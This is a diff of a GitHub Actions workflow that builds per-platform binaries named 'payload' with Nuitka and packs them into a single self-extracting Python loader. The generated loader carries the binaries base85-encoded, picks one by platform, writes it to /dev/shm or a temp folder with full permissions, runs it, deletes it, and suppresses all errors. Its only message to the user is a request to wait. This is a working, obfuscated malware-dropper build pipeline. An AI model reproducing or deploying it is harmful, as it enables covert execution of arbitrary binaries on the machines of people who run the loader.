@@ -1,7 +1,6 @@
 name: Nixon Nuitka Build
 on:
   workflow_dispatch:
-
 jobs:
   build-farm:
     strategy:
@@ -27,17 +26,14 @@ jobs:
         with:
           ref: main
           fetch-depth: 0
-
       - name: Setup Python
         
         uses: actions/setup-python@v4
         with:
           python-version: '3.11'
-          
       - name: Install Nuitka
         
         run: pip install nuitka zstandard ordered-set requests websockets
-
       - name: Build Windows
         if: matrix.os == 'windows-latest'
         shell: bash
@@ -55,7 +51,6 @@ jobs:
           name: build-${{ matrix.final_name }}
           path: ${{ matrix.final_name }}
           retention-days: 1
-
   pack:
     needs: build-farm
     runs-on: ubuntu-latest
@@ -67,7 +62,6 @@ jobs:
         with:
           path: artifacts
           merge-multiple: true
-      
       - name: Flatten Artifacts
         run: |
           find artifacts -type f -exec mv {} . \;
@@ -76,7 +70,6 @@ jobs:
         run: |
           cat << 'EOF' > packer.py
           import sys, os, zipfile, io, base64, tempfile, shutil, subprocess, platform
-          
           def get_platform_key():
               s = platform.system().lower()
               if "windows" in s: return "windows"
@@ -86,71 +79,46 @@ jobs:
                       return "android"
                   return "linux"
               return "unknown"
-          
           def pack():
               print("[*] Starting Universal Pack...")
-              
-              # Map artifact names to internal keys
               mapping = {
                   "payload.windows.exe": "windows",
                   "payload.linux.bin": "linux",
                   "payload.macos.bin": "macos",
                   "payload.android.bin": "android"
               }
-              
               final_zip = io.BytesIO()
-              # Use ZIP_LZMA for Maximum Compression (Smallest possible size)
               with zipfile.ZipFile(final_zip, "w", zipfile.ZIP_LZMA) as z:
                   for root, _, files in os.walk("."):
                       for f in files:
                           if f in mapping:
                               print(f" [+] Adding {f} as {mapping[f]}...")
                               z.write(f, mapping[f])
-              
-              # [UPDATE] Encode to Base85 (Smaller than Base64)
               payload_encoded = base64.b85encode(final_zip.getvalue()).decode()
-              
-              # Generate the self-extracting Python loader
               loader_code = f"""# -*- coding: utf-8 -*-
           import sys, os, base64, zipfile, io, tempfile, subprocess, platform, shutil
           import time
-          
-          # [UPDATE] Base85 Payload
           PAYLOAD = "{payload_encoded}"
-          
           def run():
               print("Please wait up to 30 seconds for execution...")
-              
-              # 1. Detect Platform
               s = platform.system().lower()
               target = "linux"
               if "windows" in s: target = "windows"
               elif "darwin" in s: target = "macos"
               elif "linux" in s:
                   if os.path.exists("/system/build.prop"): target = "android"
-              
-              # 2. Extract specific binary for this platform
               try:
-                  # [UPDATE] Decode Base85
                   raw = base64.b85decode(PAYLOAD)
-                  
                   with zipfile.ZipFile(io.BytesIO(raw)) as z:
                       if target not in z.namelist():
                           return
-                      
-                      # 3. Write to temp (Memory-backed on Linux if possible, Disk on Win)
                       mem_path = "/dev/shm" if os.path.exists("/dev/shm") else tempfile.gettempdir()
                       ext = ".exe" if target == "windows" else ".bin"
-                      
                       fd, path = tempfile.mkstemp(suffix=ext, dir=mem_path)
                       os.close(fd)
-                      
                       with open(path, "wb") as f:
                           f.write(z.read(target))
-                      
                       os.chmod(path, 0o777)
-                      
-                      # 4. Execute
                       try:
                           subprocess.call([path] + sys.argv[1:])
                       finally:
@@ -158,21 +126,17 @@ jobs:
                               try: os.remove(path)
                               except: pass
               except Exception: pass
-          
           if __name__ == "__main__":
               run()
           """
               with open("Universal_Loader.py", "w") as f:
                   f.write(loader_code)
               print("[+] Universal_Loader.py generated (Base85 Optimized).")
-          
           if __name__ == "__main__":
               pack()
           EOF
-          
       - name: Run Packer
         run: python packer.py
-        
       - name: Upload Universal Loader
         uses: actions/upload-artifact@v4
         with:
